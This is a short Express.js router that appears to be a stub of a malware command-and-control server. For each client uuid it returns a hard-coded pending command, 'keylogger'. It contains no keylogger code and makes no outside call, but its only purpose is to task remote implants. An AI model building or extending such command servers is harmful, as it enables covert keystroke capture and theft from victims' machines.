const express = require("express")
const router = express.Router()

module.exports = () => {

    router.get("/:uuid", (req, res) => {
        obj = {
            "cmd": "keylogger"
        }
        res.send(`Send waiting commands for uuid : ${req.params.uuid} <br> 
        ${JSON.stringify(obj)}`)
    })

    return router
}

